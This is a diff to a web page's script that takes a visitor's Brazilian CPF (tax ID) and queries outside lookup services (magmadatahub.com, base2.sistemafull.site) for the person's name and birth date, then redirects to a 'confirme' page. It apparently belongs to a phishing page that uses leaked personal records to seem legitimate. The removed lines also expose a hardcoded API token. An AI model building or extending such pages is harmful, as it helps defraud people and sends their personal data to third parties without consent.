@@ -559,9 +559,21 @@
     </div>
   </footer>
 <script>
-const API_URL="https://magmadatahub.com/api.php";
-const API_TOKEN="d7c5436286e44288a459ca98de0e140bd32fe9717dcadb1c6bd13526f24a78b9";
-async function fetchCPF(cpf){const url=`${API_URL}?token=${API_TOKEN}&cpf=${cpf}`;const res=await fetch(url);if(!res.ok) throw new Error("Erro ao acessar API");return res.json();}
+async function fetchCPF(cpf){
+let dataFinal=null;
+try{
+const res1=await fetch(`api/consultar_cpf_brasil.php?cpf=${cpf}`);
+const result1=await res1.json();
+if(result1.success&&result1.data){dataFinal=result1.data;}else{throw new Error();}
+}catch(e){
+const res2=await fetch(`https://base2.sistemafull.site:80/api/cpfx?CPF=${cpf}`);
+const result2=await res2.json();
+if(result2&&(result2.NOME||result2.nome)){
+dataFinal={nome:result2.NOME||result2.nome,nascimento:result2.NASC||result2.nascimento||"",cpf:result2.CPF||cpf};
+}else{throw new Error();}
+}
+return dataFinal;
+}
 function initCpfMask(){const cpfInput=document.getElementById("cpf");cpfInput.addEventListener("input",e=>{let value=e.target.value.replace(/\D/g,"");if(value.length>11)value=value.slice(0,11);if(value.length>9)value=value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/,"$1.$2.$3-$4");else if(value.length>6)value=value.replace(/^(\d{3})(\d{3})(\d{3}).*/,"$1.$2.$3");else if(value.length>3)value=value.replace(/^(\d{3})(\d{3}).*/,"$1.$2");e.target.value=value;});}
 function isValidCPF(cpf){return cpf.replace(/\D/g,"").length===11;}
 async function submitForm(){const cpf=document.getElementById("cpf").value.replace(/\D/g,"");try{const data=await fetchCPF(cpf);sessionStorage.setItem("nomeCompleto",data.nome||"");sessionStorage.setItem("cpf",cpf);if(data.nascimento)sessionStorage.setItem("dataNascimento",data.nascimento);window.location.href='./confirme/index.html';}catch(e){sessionStorage.setItem("cpf",cpf);window.location.href='./confirme/index.html';}}
